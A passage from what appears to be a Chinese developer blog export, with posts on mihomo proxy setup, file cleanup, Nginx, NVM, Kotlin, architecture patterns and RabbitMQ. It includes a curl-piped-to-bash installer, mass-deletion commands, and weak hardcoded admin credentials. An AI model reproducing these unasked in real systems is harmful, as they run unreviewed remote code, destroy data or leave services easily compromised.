在将mihomo添加到系统服务之前，最好手动运行一次观察是否正常。
 sudo /usr/local/bin/mihomo -d /etc/mihomo

如果启动成功，没出现错误信息，那就可以创建 mihomo 服务：
 sudo vim /etc/systemd/system/mihomo.service

粘贴以下内容
 [Unit]Description=mihomo Daemon, Another Clash Kernel.After=network.target NetworkManager.service systemd-networkd.service iwd.service[Service]Type=simpleLimitNPROC=500LimitNOFILE=1000000CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_RAW CAP_NET_BIND_SERVICE CAP_SYS_TIME CAP_SYS_PTRACE CAP_DAC_READ_SEARCHAmbientCapabilities=CAP_NET_ADMIN CAP_NET_RAW CAP_NET_BIND_SERVICE CAP_SYS_TIME CAP_SYS_PTRACE CAP_DAC_READ_SEARCHRestart=alwaysExecStartPre=/usr/bin/sleep 1sExecStart=/usr/local/bin/mihomo -d /etc/mihomoExecReload=/bin/kill -HUP $MAINPID[Install]WantedBy=multi-user.target

重载systemd并启动mihomo服务
 systemctl daemon-reload # 重载 systemdsystemctl enable mihomo # 允许服务自启动systemctl start mihomo # 启动服务

接下来访问对应的ip的控制面板http://xxx.xxx.xxx.xxx/ui:9090就可以控制你的mihomo代理了。
配置TUN模式解释：

TUN 模式是 Windows 系统中的一种虚拟网络接口模式,全称为”TUNnel”模式。TUN 模式会创建一个虚拟的点对点网络连接,这个连接会显得像一个真实的物理网络接口一样。它常用于创建 VPN(虚拟私有网络)连接。TUN是三层设备 ，模拟一个网络层设备，操作第三层数据包比如 IP 数据包，TUN 虚拟网卡实现 IP 层隧道Tun 模式通过新建一个 Tun 虚拟网卡接受操作系统的三层浏览流量，从而拓展 Clash 入口（inbound）转发能力，Tun 模式可以提升 Clash 处理 UDP 流量的能力，可以劫持任何三层流量，实现 DNS 劫持也是轻而易举，并且它与部分操作系统的网络栈结合也非常好，可以提升利用 iptables 等组件的能力

相比于普通的全局代理模式(即配置http_proxy之类，详见我曾经的某篇文章clash快速开启和关闭代理模式)
TUN模式会从网络层，将所有的数据都进行转发。(解决了一些：docker必须单独配置主动代理，docker内容器无法走代理以及一些系统层面不走普通代理的问题) 这种模式在我平常玩路由器配置openclash的时候，一般都称之为透明代理。而这才是我最需要的功能。
开启流量转发
编辑/etc/sysctl.conf文件
 vim /etc/sysctl.conf

将以下代码取消注释
 net.ipv4.ip_forward=1net.ipv6.conf.all.forwarding=1

加载内核参数
 sysctl -p

具体的TUN配置已经在上面的config.yaml中配置完了。所以到这里为止。我们就可以愉快的玩耍了！(声明，我并没有使用fake-ip模式。考虑原因的话，我觉得我不是特别需要很好的性能，相对而言可以直观的看到ping通的信号更加方便)关于如何使用路由器实现透明代理的话，我以后再出篇博客重新讲。
部分引用自Linux 安装 Clash 内核并开启透明代理
]]></content>
      <tags>
        <tag>代理</tag>
        <tag>mihomo</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux如何大量删除小文件</title>
    <url>/posts/10594f77/</url>
    <content><![CDATA[清楚了问题现象，解决方案就从除去rm -rf *命令的方式之外，还有哪些方法可用，如果通过网络搜索，可能会找到结合find命令再去执行rm的方式，但其实效率非常差，具体写法这里就不列出了，因为我们通常也不会这样处理。那么如何较为效率的删除大批小文件呢？结合网络的经验，并实测验证，最终总结了两种常见的解决方案，效率上也都尚可。
方案一：巧用rsync的方式达到删除目的建立一个空文件夹，使用rsync --delete-before -d &lt;空文件夹&gt; &lt;需要清理删除小文件的目录&gt;命令最终达到删除大批小文件的目的。下面演示具体操作：
[oracle@jystdrac2 adump]$ mkdir /data/null[oracle@jystdrac2 adump]$ ls -l /data/nulltotal 0[oracle@jystdrac2 ~]$ nohup rsync --delete-before -d /data/null/ /opt/app/oracle/admin/crmdb/adump/ &amp;

方案二：使用find命令的delete参数使用find &lt;需要清理删除小文件的目录&gt; -type f -delete命令直接删除大批小文件。
[oracle@jystdrac1 adump]$ nohup find /opt/app/oracle/admin/crmdb/adump/ -type f -delete &amp;


总结1.mkdir &lt;空文件夹&gt;rsync –delete-before -d &lt;空文件夹&gt; &lt;需要清理删除小文件的目录&gt;2.find &lt;需要清理删除小文件的目录&gt; -type f -delete
相对来说这两种方式都比较效率，但由于整体小文件也是比较多，所以实际可以选择nohup放到后台执行。
]]></content>
  </entry>
  <entry>
    <title>Linux——让程序在后台运行</title>
    <url>/posts/4187f35a/</url>
    <content><![CDATA[加“&amp;”符号在需要执行的命令后面直接加上&amp;，
# 执行文件./test.py &amp;# 查看是否在后台运行ps -ef | grep test# 后台关闭kill 这个程序

nohup命令# 他会执行该人物并将输出放到nohup.out中nohup ./test.py &amp;# 关闭后台时也需要使用kill删除进程

screen命令（推荐）# 安装screensudo apt install screen//yum install screen# 新建一个窗口screen -S test# 进入窗口后执行程序python test.py# 退出当前窗口ctrl+a+d (保留窗口)screen -d (保留窗口)exit (退出且不保留窗口)# 查看窗口screen -ls# 重新连接窗口screen -r id或窗口名称]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
  </entry>
  <entry>
    <title>Linux默认使用bash</title>
    <url>/posts/4f1bd4e/</url>
    <content><![CDATA[
最近在玩服务器的时候，发现新添加的用户user默认使用的是sh而不会是bash,这就导致使用起来很不习惯

有最高权限
以具有sudo权限的管理员用户登录到Linux系统。

打开终端或命令行界面。

编辑 /etc/passwd 文件，可以使用任何文本编辑器，如vi或nano。在终端中运行以下命令打开该文件：


sudo vi /etc/passwd

在该文件中找到你想要修改的普通用户的行。每个用户的行看起来类似于：

username:x:1000:1000:User Name:/home/username:/bin/sh
注意到最后的 /bin/sh，这是默认的受限shell。我们需要将其更改为 /bin/bash，以便用户登录后进入bash。

现在，当该用户登录时，他们将默认进入bash shell。

没有sudo权限如果你没有sudo权限的管理员用户，但仍希望将默认shell更改为bash，你可以尝试以下方法：
步骤：

以当前普通用户登录到Linux系统。
打开终端或命令行界面。
检查当前用户可以使用的shell列表，可以使用以下命令：

cat /etc/shells
这将显示系统上可用的shell列表。确保bash（/bin/bash）在列表中。

使用 chsh 命令更改当前用户的默认shell。运行以下命令：

chsh -s /bin/bash
系统会要求你输入当前用户的密码进行验证。

输入密码后，chsh 命令将会将默认shell更改为bash。
退出当前会话，并重新登录。你将会进入bash shell作为默认shell。

]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
  </entry>
  <entry>
    <title>Lombok注解简化Java代码开发</title>
    <url>/posts/1a6b91a4/</url>
    <content><![CDATA[如何导入&lt;dependency&gt;    &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;    &lt;artifactId&gt;lombok&lt;/artifactId&gt;    &lt;version&gt;1.18.4&lt;/version&gt;    &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt;
@Setter 注解在类或字段，注解在类时为所有字段生成setter方法，注解在字段上时只为该字段生成setter方法。@Getter 使用方法同上，区别在于生成的是getter方法。@ToString 注解在类，添加toString方法。@EqualsAndHashCode 注解在类，生成hashCode和equals方法。@NoArgsConstructor 注解在类，生成无参的构造方法。@RequiredArgsConstructor 注解在类，为类中需要特殊处理的字段生成构造方法，比如final和被@NonNull注解的字段。@AllArgsConstructor 注解在类，生成包含类中所有字段的构造方法。@Data 注解在类，生成setter&#x2F;getter、equals、canEqual、hashCode、toString方法，如为final属性，则不会为该属性生成setter方法。@Slf4j 注解在类，生成log变量，严格意义来说是常量。private static final Logger log &#x3D; LoggerFactory.getLogger(UserController.class);
优点：

能通过注解的形式自动生成构造器、getter&#x2F;setter、equals、hashcode、toString等方法，提高了一定的开发效率

让代码变得简洁，不用过多的去关注相应的方法

属性做修改时，也简化了维护为这些属性所生成的getter&#x2F;setter方法等缺点：

不支持多种参数构造器的重载

虽然省去了手动创建getter&#x2F;setter方法的麻烦，但大大降低了源代码的可读性和完整性，降低了阅读源代码的舒适度


]]></content>
      <tags>
        <tag>JAVA</tag>
        <tag>Lombok</tag>
      </tags>
  </entry>
  <entry>
    <title>MVC MVP MVVM MVI架构</title>
    <url>/posts/c7f557a/</url>
    <content><![CDATA[MVCModel：实体类(数据的获取、存储、数据状态变化)。View：布局文件Controller：Activity(处理数据、业务和UI)。![](https://image.zfxt.top/hexo-blog/MVC MVP MVVM MVI架构-2023-10-12-22-10.png)缺点：随着界面及其逻辑的复杂度不断提升，Activity类的职责不断增加，以致变得庞大臃肿。为了解决MVC的缺点，MVP 框架被提出来。
MVPModel：实体类(数据的获取、存储、数据状态变化)。View：布局文件+Activity。Presenter：中介，负责完成View与Model间的交互和业务逻辑。![](https://image.zfxt.top/hexo-blog/MVC MVP MVVM MVI架构-2023-10-14-08-28.png)

MVP的优点

复杂的逻辑处理放在Presenter进行处理，减少了Activity的臃肿。解耦。Model层与View层完全分离，修改V层不会影响M层，降低了耦合性。可以将一个Presenter用于多个视图，而不需要改变Presenter的逻辑。Presenter层与View层的交互是通过接口来进行的，便于单元测试。

MVP的缺点

维护困难。Presenter中除了业务逻辑以外，还有大量的View-&gt;Model，Model-&gt;View的手动同步逻辑，造成Presenter比较笨重，维护起来会比较困难。接口膨胀
MVVMModel：实体类(数据的获取、存储、数据状态变化)。View：布局文件+Activity。ViewModel： 关联层，将Model和View进行绑定，Model或View更改时，实时刷新对方。![](https://image.zfxt.top/hexo-blog/MVC MVP MVVM MVI架构-2023-10-15-20-41.png)

提高可维护性。Data Binding可以实现双向的交互，使得视图和控制层之间的耦合程度进一步降低，分离更为彻底，同时减轻了Activity的压力。
简化测试。因为同步逻辑是交由Binder做的，View跟着Model同时变更，所以只需要保证Model的正确性，View就正确。大大减少了对View同步更新的测试。
ViewModle易于单元测试。

MVIModel: 与MVVM中的Model不同的是，MVI的Model主要指UI状态（State）。例如页面加载状态、控件位置等都是一种UI状态View: 与其他MVX中的View一致，可能是一个Activity或者任意UI承载单元。MVI中的View通过订阅Model的变化实现界面刷新Intent: 此Intent不是Activity的Intent，用户的任何操作都被包装成Intent后发送给Model层进行数据请求![](https://image.zfxt.top/hexo-blog/MVC MVP MVVM MVI架构-2023-10-18-27-35.png)
单向数据流MVI强调数据的单向流动，主要分为以下几步：![](https://image.zfxt.top/hexo-blog/MVC MVP MVVM MVI架构-2023-10-19-11-25.png)

用户操作以Intent的形式通知Model
Model基于Intent更新State
View接收到State变化刷新UI。

![](https://image.zfxt.top/hexo-blog/MVC MVP MVVM MVI架构-2023-10-19-48-07.png)MVI有以下优势
强调数据单向流动，很容易对状态变化进行跟踪和回溯使用ViewState对State集中管理，只需要订阅一个 ViewState 便可获取页面的所有状态，相对 MVVM 减少了不少模板代码ViewModel通过ViewState与Action通信，通过浏览ViewState 和 Aciton 定义就可以理清 ViewModel 的职责，可以直接拿来作为接口文档使用。
当然MVI也有一些缺点，比如
所有的操作最终都会转换成State，所以当复杂页面的State容易膨胀state是不变的，因此每当state需要更新时都要创建新对象替代老对象，这会带来一定内存开销

该文引用自(稀土掘金)[https://juejin.cn/post/7043716896767606798]

]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>MVI</tag>
        <tag>架构</tag>
      </tags>
  </entry>
  <entry>
    <title>Map和MutableMap：键值对集合</title>
    <url>/posts/e94964a/</url>
    <content><![CDATA[记一个关于Map的知识kotlin中有Map和MutableMap两种

Map是一个接口和通用的元素集合。 Map以键和值对的形式保存数据。 映射的键是唯一的，每个键只保留一个值。 键和值可以是不同类型。 也被分为可变的和不可变的，即Map与MutableMap.

Map它是不可变的，它的大小固定，方法支持只读访问。要使用Map接口，需要使用mapOf()或mapOf &lt;k，v&gt;()函数声明。他的常用方法：getValue(key)	它返回给定键的值，如果映射中没有这样的键，则抛出异常。getOrDefault(key,defaultValue)	获取指定key值的value，没有值时返回默认值contains(key)、containsKey(key)	它检查在Map中是否包含给定的键。minus(key)	返回去除该 key-value的mapplus(pair)	向map中添加key - value但这些方法不能对原Map产生改变。需要改变的话需要使用
map = map.plus(a to b)
型如上的方法。
MutableMapMutableMap是集合框架的接口，它以键和值对的形式保存对象。 通过使用相应的键来检索MutableMap接口的值。 键和值可以是不同类型的对，它是可变的。
常用方法MutableMap常用函数函数	描述put(key,value)、MutableMap[key]&#x3D;value	放入key-value对。如果原来已有key，value将被覆盖putAll(Map)	向原map中添加整个mapremove(key)	删除指定key以及对应valueremove(key, value)	存在键和值实体时，才会删除它们clear()	删除所有元素contains(key)、containsKey(key)	检查是否包含给定键，如果map包含指定的键，则返回truecontainsValue(value)	如果包含给定值的一个或多个键，则返回truecount()	它返回key-value对的总数get(key)	返回与键对应的值，如果找不到指定键，则返回nullgetOrDefault(key, defaultValue)	返回带有相应指定键的值，如果没有key对应的value，则返回默认值getValue(key)	返回与给定键对应的值，如果找不到键，则抛出异常
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Mock助力前端后端异步开发</title>
    <url>/posts/dad39b92/</url>
    <content><![CDATA[ApiFox在使用apifox时，才深知mock的作用。简直不要太好用了呀。在没有mock的时候，前端和后端分开开发，必须要等后端把功能完善好了才可以获取到数据，而这往往会降低开发效率，前端必须等后端开发完才能开始开发（这里指的是那种依托后端数据的情况）。同时在后端开发后，往往需要API文档，前端才能够完成正确的开发。非常的耗时耗力。而这。也正是apifox解决的问题所在。
简单来说，mock就是用来模拟数据给前端去使用的。前端通过mock可以与后端实现异步开发。大大的提高效率，而且通过apifox不仅实现了前后端快速开发。而且使得api文档也可以快速生成。以上只是帮助理解mock的含义和概念，具体使用请查看apifox的官方文档

引用自掘金

]]></content>
      <tags>
        <tag>mock</tag>
      </tags>
  </entry>
  <entry>
    <title>NVM的安装和使用</title>
    <url>/posts/5a6c750f/</url>
    <content><![CDATA[#nvm

node：是一个基于 Chrome V8 引擎的 JS 运行环境。
npm：是 node.js 默认的包管理系统（用 JavaScript 编写的），在安装的 node 的时候，npm 也会跟着一起安装，管理 node 中的第三方插件。
npx：npm 从 v5.2.0 开始新增了 npx 命令，&gt;&#x3D; 该版本会自动安装 npx，附带：npx 有什么作用跟意义？为什么要有 npx？什么场景使用？。
nrm：是一个 npm 源管理工具，使用它可以快速切换 npm 源，默认是官方源，当 npm 下载包过慢时，可能需要切换到第三方源（例如：淘宝、科大…），还有公司私有源地址等等。
nvm：node 版本管理器，也就是说：一个 nvm 可以管理多个 node 版本（包含 npm 与 npx），可以方便快捷的 安装、切换 不同版本的 node。

安装nvm的安装只需要执行以下一条命令linux下
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash
windows下，直接去官网，即可下载得到正版
常用命令nvm list // 查看安装的所有node的版本​nvm list available // 查看当前可安装的版本​nvm install xx.xx.xx  // 安装xx.xx.xx版本的node​nvm use xx.xx.xx // 使用（切换到）xx.xx.xx版本的node​nvm uninstall xx.xx.xx  // 卸载xx.xx.xx版本的node​nvm arch // 显示node是运行在32位还是64位。​nvm on // 开启node.js版本管理​nvm off // 关闭node.js版本管理​nvm proxy [url] // 设置下载代理。不加可选参数url，显示当前代理。将url设置为none则移除代理。​nvm node_mirror [url] // 设置node镜像。默认是https://nodejs.org/dist/。如果不写url，则使用默认url。设置后可至安装目录settings.txt文件查看，也可直接在该文件操作。nvm npm_mirror [url] // 设置npm镜像。https://github.com/npm/cli/archive/。如果不写url，则使用默认url。设置后可至安装目录settings.txt文件查看，也可直接在该文件操作。​nvm root [path] // 设置存储不同版本node的目录。如果未设置，默认使用当前目录。
换源在linux下，可以在/etc/profile或者~/.bashrc定义全局变量,然后source去刷新
export NVM_NODEJS_ORG_MIRROR=https://npmmirror.com/mirrors/node
在windows下，修改nvm配置目录的setting.txt文件加上
node_mirror: https://npmmirror.com/mirrors/node/npm_mirror: https://npmmirror.com/mirrors/npm/]]></content>
      <categories>
        <category>nvm</category>
      </categories>
  </entry>
  <entry>
    <title>Nginx URI 匹配和位置配置</title>
    <url>/posts/8e6632a6/</url>
    <content><![CDATA[location配置
匹配 URI 类型，有四种参数可选，当然也可以不带参数。
命名location，用@来标识，类似于定义goto语句块。1. location =    # 精准匹配2. location ^~   # 带参前缀匹配3. location ~    # 正则匹配（区分大小写）4. location ~*   # 正则匹配（不区分大小写）5. location /a   # 普通前缀匹配，优先级低于带参数前缀匹配。6. location /    # 任何没有匹配成功的，都会匹配这里处理

]]></content>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Node.js 工具集：npm、npx、nrm、nvm</title>
    <url>/posts/7f6c5dad/</url>
    <content><![CDATA[
node：是一个基于 Chrome V8 引擎的 JS 运行环境。

npm：是 node.js 默认的包管理系统（用 JavaScript 编写的），在安装的 node 的时候，npm 也会跟着一起安装，管理 node 中的第三方插件。

npx：npm 从 v5.2.0 开始新增了 npx 命令，&gt;&#x3D; 该版本会自动安装 npx，附带：npx 有什么作用跟意义？为什么要有 npx？什么场景使用？。

nrm：是一个 npm 源管理工具，使用它可以快速切换 npm 源，默认是官方源，当 npm 下载包过慢时，可能需要切换到第三方源（例如：淘宝、科大…），还有公司私有源地址等等。

nvm：node 版本管理器，也就是说：一个 nvm 可以管理多个 node 版本（包含 npm 与 npx），可以方便快捷的 安装、切换 不同版本的 node。


安装nvm的安装只需要执行以下一条命令linux下
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash
windows下，直接去官网，即可下载得到正版
常用命令nvm list // 查看安装的所有node的版本​nvm list available // 查看当前可安装的版本​nvm install xx.xx.xx  // 安装xx.xx.xx版本的node​nvm use xx.xx.xx // 使用（切换到）xx.xx.xx版本的node​nvm uninstall xx.xx.xx  // 卸载xx.xx.xx版本的node​nvm arch // 显示node是运行在32位还是64位。​nvm on // 开启node.js版本管理​nvm off // 关闭node.js版本管理​nvm proxy [url] // 设置下载代理。不加可选参数url，显示当前代理。将url设置为none则移除代理。​nvm node_mirror [url] // 设置node镜像。默认是https://nodejs.org/dist/。如果不写url，则使用默认url。设置后可至安装目录settings.txt文件查看，也可直接在该文件操作。nvm npm_mirror [url] // 设置npm镜像。https://github.com/npm/cli/archive/。如果不写url，则使用默认url。设置后可至安装目录settings.txt文件查看，也可直接在该文件操作。​nvm root [path] // 设置存储不同版本node的目录。如果未设置，默认使用当前目录。

换源在linux下，可以在/etc/profile或者~/.bashrc定义全局变量,然后source去刷新
export NVM_NODEJS_ORG_MIRROR=https://npmmirror.com/mirrors/node
在windows下，修改nvm配置目录的setting.txt文件加上
node_mirror: https://npmmirror.com/mirrors/node/npm_mirror: https://npmmirror.com/mirrors/npm/
]]></content>
      <categories>
        <category>nvm</category>
      </categories>
  </entry>
  <entry>
    <title>Nginx：高性能Web服务器及代理</title>
    <url>/posts/ef8bc635/</url>
    <content><![CDATA[Nginx
基本概念：
一个高性能的http和反向代理web服务器，能支持高负载，效率高

正向代理通过代理服务器访问服务器，例如搭建梯子才访问www.google.com。（可以隐藏客户端的信息）这个内容就叫正向代理

反向代理一般情况下是就是客户端对代理无感知，只是通过代理服务器去隐藏目标服务器的具体信息，只暴露代理服务器的地址，隐藏真实服务器的地址。反向代理后，客户端无法知道服务器的具体位置。

负载均衡




默认情况下，是一个服务器，前后连锁相关。将原先集中到单个服务器上的情况改为请求分发到多个服务器上。    - 动静分离实际上就是前后端分离，nginx可以直接放前端的静态资源，而后端单独部署。2. 安装，配置

先安装依赖项(以centos7.8为例）yum updateyum -y install make zlib zlib-devel gcc-c++ libtool openssl openssl-devel pcre pcre-devel#下载稳定版安装包wget https://nginx.org/download/nginx-1.24.0.tar.gztar -zxvf nginx-1.24.0.tar.gz cd nginx-1.24.0#配置并安装./configure --prefix=/usr/local/nginx --conf-path=/usr/local/nginx/conf/nginx.conf --pid-path=/usr/local/nginx/conf/nginx.pid --lock-path=/usr/local/nginx/lock/nginx.lock --with-http_ssl_modulemake &amp;&amp; make install

3. 

在/usr/local/nginx/sbin/目录下,可以使用nginx的常用命令。（不方便，可以加入到path环境变量中）  查看版本号./nginx -v启动nginx./nginx关闭nginx./nginx -s stop重新加载配置./nginx -s reload
设置nginx为系统服务，在/usr/lib/systemd/system目录下添加nginx.service[Unit]Description=nginx - high performance web serverDocumentation=http://nginx.org/en/docs/After=network.target remote-fs.target nss-lookup.target [Service]Type=forkingPIDFile=/usr/local/nginx/logs/nginx.pidExecStartPre=/usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.confExecStart=/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.confExecReload=/bin/kill -s HUP $MAINPIDExecStop=/bin/kill -s QUIT $MAINPIDPrivateTmp=true [Install]WantedBy=multi-user.target
然后启动nginx并设置开机自启动systemctl start nginxsystemctl enable nginxsystemctl status nginx #查看状态


配置文件
worker_processes  1;events &#123;    worker_connections  1024;&#125;http &#123;    include       mime.types;    default_type  application/octet-stream;    sendfile        on;    keepalive_timeout  65;    server &#123;        listen       80;        server_name  localhost;        location / &#123;            root   html;            index  index.html index.htm;        &#125;        error_page   500 502 503 504  /50x.html;        location = /50x.html &#123;            root   html;        &#125; &#125;
全局块 设置整体运行的配置指令 worker_processes  1;值越大，处理并发的数量越多
events块 设置nginx服务器和用户的网络连接 work process 1024;表示最大支持1024个连接数
http块
http全局块
server块(和虚拟主机有重要关系)




每个 http 块可以包括多个 server 块，而每个 server 块就相当于一个虚拟主机。而每个 server 块也分为全局 server 块，以及可以同时包含多个 locaton 块。（☆☆☆☆☆）


反向代理实例


实例1在/usr/local/nginx/conf/nginx.conf文件中。修改其http块中的server块中的location

补充：location 指令说明
该指令用于匹配 URL， 语法如下：
location [ = | ~ | ~* | ^~] uri &#123;&#125;

= ：用于不含正则表达式的 uri 前，要求请求字符串与 uri 严格匹配， 如果匹配成功，就停止继续向下搜索并立即处理该请求。
~：用于表示 uri 包含正则表达式，并且区分大小写。
~*：用于表示 uri 包含正则表达式，并且不区分大小写。
^~：用于不含正则表达式的 uri 前，要求 Nginx 服务器找到标识 uri 和请求


字符串匹配度最高的 location 后，立即使用此 location 处理请求，而不再使用 location块中的正则 uri 和请求字符串做匹配。6. 动静分离7. nginx配置高可用集群

]]></content>
      <tags>
        <tag>linux</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>ORM框架比较：Mybatis、Hibernate、JPA、Bee、sqltoy</title>
    <url>/posts/4cfcba53/</url>
    <content><![CDATA[记录一次阅览的过程相关了解到的有Mybatis,Hibernate,JPA+QueryDSL,sagacity-sqltoy,Bee。简单的记录一下网上的评论和自己的理解。
Mybatis他的本质就是一个SqlUtils。并不是一个orm框架。他的作用是将sql语句与java代码分离开来。通过xml的格式来书写sql语句。进而完成对数据库的控制，不用手动设置参数和对结果集的处理因为是靠自己去写sql语句的。所以他的性能取决于你对sql的理解程度。
Mybatis-plus这里引用一句他人的评论

主要是mybatis带来了几个问题：1、大量的人见到xml就反，就觉得low,这个问题的核心是mybatis的sql写法不直观，基本就是传统java中拼sql的逻辑xml化；2、大家其实都认同单表操作jpa和简单查询QueryDSL，所以产生了大量基于mybatis的plus来做JPA功能；网上不下二十个mybatis的增强，其实这些都可以从JPA、JOOQ上得到启发，基本没有什么创新，无法解决项目中的实质痛点。

HibernateHibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，它将POJO与数据库表建立映射关系，是一个全自动的orm框架，hibernate可以自动生成简单的SQL语句，自动执行，对于复杂的sql语句，Hibernate不需要自己编写，因此它的性能不是很好。他可以完全通过调用方法来完成所有的对数据库的操作，可以不用进行sql语句的操作和优化。
ORM的工作原理ORM 的工作原理

以一定的映射方式，把实体模型和数据库关系的映射
ORM框架启动时加载这些映射和数据库配置文件
ORM通过对原生jdbc的封装提供更加便利的操作
Dao通过ORM提供便捷API对象的方式操作数据库关系

JPA+QueryDSL什么是JPAJPA 是Java Persistence API的缩写，是一套由Java官方制定的ORM标准。当制定这套标准以后，市场上就出现很多JPA框架。如：OpenJPA（apache），EclipseTop（linktop）(eclipse)，Hibernate。他的出现比Hibernate更早，他属于元老级别的标准。他不需要使用XML映射文件。他大多采用注解的方式，将实体类与表、其中的字段，列名，相对应。
QueryDSL他就类似于Lombok。用来做简单的单表操作
Bee 完整的ORM框架尚未去了解，可以去官网查看。他被说的很厉害，但尚未尝试。gitee项目
sqltoy尚未了解
]]></content>
      <tags>
        <tag>ORM框架</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLite：单线程数据库，适用于小型项目</title>
    <url>/posts/24c233fa/</url>
    <content><![CDATA[SQLite是一个嵌入式数据库引擎，它被设计为单线程访问。这意味着在默认情况下，SQLite不支持多线程并发访问同一个数据库连接。当多个线程尝试同时访问同一个数据库连接时，可能会导致数据库文件损坏或产生不可预测的结果。但是其实作为嵌入式数据库，他本身已经可以支撑的起小型项目了。前期都可以用sqlite来维系数据库
]]></content>
      <tags>
        <tag>Sqlite</tag>
      </tags>
  </entry>
  <entry>
    <title>RabbitMq入门</title>
    <url>/posts/7554994e/</url>
    <content><![CDATA[消息队列MQ是一种常见的上下游“逻辑解耦+物理解耦”的消息通信服务MQ三大功能：流量消峰，应用解耦，异步处理主流MQ：kafka，rocketMQ，rabbitMQ
RabbitMQ4大核心概念生产者，消费者，交换机，队列


RabbitMQ的安装这里使用docker的方式进行安装

拉取镜像docker pull rabbitmq
启动进程docker run -d --restart=always --name my-rabbitmq -p 5672:5672 -p 15672:15672 rabbitmq
这时已经算是启动好了应用，但是任然无法访问
开启插件// 1、进入容器docker exec -it my-rabbitmq bash // 2、开启插件rabbitmq-plugins enable rabbitmq_management//创建账号rabbitmqctl add_user admin 123//设置用户角色rabbitmqctl set_user_tags admin administrator//设置用户权限//(默认最大)rabbitmqctl set_permissions -p &quot;/&quot; admin &quot;.*&quot; &quot;.*&quot; &quot;.*&quot;//查看用户角色rabbitmqctl list_users

图标问题无法显现🪁解决方案🐳 1、查看所有容器（看id）docker ps -a
🐳 2、进入容器内部docker exec -it 容器id &#x2F;bin&#x2F;bash
🐳3、进入指定目录cd &#x2F;etc&#x2F;rabbitmq&#x2F;conf.d&#x2F;
🐳4、修改 management_agent.disable_metrics_collector &#x3D; falseecho management_agent.disable_metrics_collector &#x3D; false &gt; management_agent.disable_metrics_collector.conf
🐳5、退出容器exit
🐳6、重启容器docker restart 容器Id原文来自csdn
生产者代码package top.zfxt.rabbitmq.oneimport com.rabbitmq.client.ConnectionFactory/** * Produce * 生产者：发消息 * @constructor Create empty Produce *///队列名称const val QUEUE_NAME=&quot;hello&quot;fun main() &#123;    //创建一个连接工厂    val factory = ConnectionFactory()    //工厂IP 连接rabbitMQ的队列    factory.host=&quot;zfxt.top&quot;    //用户名    factory.username=&quot;admin&quot;    //密码    factory.password=&quot;admin&quot;    //创建链接    val connection = factory.newConnection()    //获取信道    val channel = connection.createChannel()    //生成一个队列    channel.queueDeclare(QUEUE_NAME,false,true,false,null)    //准备发消息    val message = &quot;hello world&quot;    channel.basicPublish(&quot;&quot;, QUEUE_NAME,null,message.toByteArray())    println(&quot;消息发送完毕&quot;)&#125;

消费者代码package top.zfxt.rabbitmq.oneimport com.rabbitmq.client.ConnectionFactoryfun main() &#123;    //创建链接工厂    val factory = ConnectionFactory()    factory.host = &quot;zfxt.top&quot;    factory.username = &quot;admin&quot;    factory.password = &quot;admin&quot;    val connection = factory.newConnection()    val channel = connection.createChannel()    /**     * 消费者消费消息     */    try &#123;        channel.basicConsume(            QUEUE_NAME, false,            &#123; consumerTag, message -&gt;            println(String(message.body))        &#125;,            &#123; consumerTag -&gt;            println(&quot;消息消费被中断&quot;)        &#125;)    &#125; catch (e: Exception) &#123;        e.printStackTrace()    &#125;&#125;

Work Queue（简单模式和工作模式）情景：出现生产者产生大量的消息需要通过消费者去执行，而每个消息，只能被处理一次，不能处理多次，只能被一个消费者处理。因此为了能够提高效率，采用轮询的方式，当一个消费者获得消息后，就让另一个消费者获得下一个消息。
消息应答情景：如果一个消费者正在处理消息时，突然宕机，而队列中该消息已经删除。就会导致消息丢失。因此为了保证消息不丢失。引入了应答机制。只有在消费者处理了消息并且应答之后，rabbitMQ才会删除该消息。

自动应答：他的做法是，当消费者接收到消息内容后即刻返回应答，未必完成处理。这种多适用于高吞吐量时，与数据传输安全做权衡。尽量少使用
手动应答Channel.basicAck()肯定应答Channel.basicNack()否定应答Channel.basicReject()直接丢弃该消息，直接拒绝优点：他可以批量应答：Multiple，

消息自动重新入队如果消息在消费者手中处理时，由于网络等问题无法发送ack确认信息。rabbitMQ会将该消息重新入队。这样可以确保不会丢失信息。
消息持久化用于保证消息不会丢失，当出现了rabbitMQ奔溃宕机时，确保消息不丢失，就需要使用到消息持久化

队列持久化即使重启rabbitmq，这个队列依然存在（即修改duration属性为true）
消息持久化保证消息会被保存到磁盘上，不会丢失。但是它并不能完全保证不会丢失消息。他会存在一些延迟（修改props属性，添加MessageProperties.PERSISTENT_TEXT_PLAIN)(完整做法是加上发布确认)在生产者的代码中加上//开启发布确认    channel.confirmSelect()

确认发布
单个确认发布同步确认消息。单个发布单个确认。缺点：发布速度特别慢
//单个消息发布后立刻确认(确认后返回true)            var flag = channel.waitForConfirms()            if(flag)&#123;                println(&quot;消息发送成功&quot;)            &#125;

批量确认发布
for (i in 0..MESSAGE_COUNT) &#123;            val message = &quot;message $i&quot;            channel.basicPublish(&quot;&quot;,QUEUE_NAME,null,message.toByteArray())            //单个消息发布后立刻确认(确认后返回true)            var flag = channel.waitForConfirms()            if(flag)&#123;                println(&quot;消息发送成功&quot;)            &#125;                        //批量确认            if(i%100==0)&#123;                var flag = channel.waitForConfirms()                if(flag)&#123;                    println(&quot;消息发送成功&quot;)                &#125;            &#125;        &#125;
缺点：如果出现确认问题，无法判断是那个消息出现的错误

异步确认发布异步确认发布，比上面两个操作都要复杂。但是他的性价比最高。可以容易的判断是哪个消息出了问题
